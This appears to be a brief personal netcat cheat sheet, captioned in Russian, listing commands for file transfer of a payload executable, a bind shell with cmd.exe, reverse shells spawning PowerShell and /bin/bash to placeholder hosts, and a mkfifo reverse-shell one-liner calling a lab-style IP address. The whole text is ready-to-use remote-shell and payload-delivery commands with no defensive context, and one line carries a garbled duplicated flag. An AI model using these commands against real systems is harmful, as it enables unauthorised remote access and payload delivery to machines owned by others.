nc -e powershell.exe REMOTE 4444  
nc -lvp 4444  
  
nc -nlvp 4444 > payload.exe  
nc -nv TARGET 4444 < payload.exe  
^Передача файла по сети  
  
nc -nlvp 4444 -e cmd.exe  
nc -nv WIN_IP 4444  
^Bind shell  
  
nc -nv NIX_IP 4444 -e /bin/bash  
nc -nc -nlvp 4444  
^Reverse shell  
  
  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.52 4444 > /tmp/f